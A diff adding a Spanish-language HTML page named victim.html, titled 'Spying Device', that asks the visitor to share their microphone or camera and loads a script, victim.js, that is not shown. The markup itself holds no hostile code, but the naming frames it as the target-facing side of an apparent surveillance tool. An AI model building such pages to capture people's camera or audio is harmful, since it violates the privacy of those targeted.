@@ -1,0 +1,40 @@
+<!-- victim.html -->
+<!DOCTYPE html>
+<html lang="es">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Dispositivo de Espionaje</title>
+ <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+ <div class="container">
+ <div class="header">
+ <h1>Dispositivo de Espionaje</h1>
+ <p>Selecciona qué dispositivo deseas compartir</p>
+ </div>
+ 
+ <div class="controls">
+ <button id="micButton" class="control-btn">
+ <span class="btn-icon">🎤</span>
+ <span class="btn-text">Micrófono</span>
+ </button>
+ 
+ <button id="cameraButton" class="control-btn">
+ <span class="btn-icon">📷</span>
+ <span class="btn-text">Cámara</span>
+ </button>
+ </div>
+ 
+ <div class="permission-area" id="permissionArea">
+ <div class="permission-message" id="permissionMessage"></div>
+ <video id="localVideo" autoplay playsinline muted></video>
+ <audio id="localAudio" autoplay></audio>
+ </div>
+ 
+ <div class="status" id="status"></div>
+ </div>
+
+ <script src="victim.js"></script>
+</body>
+</html>
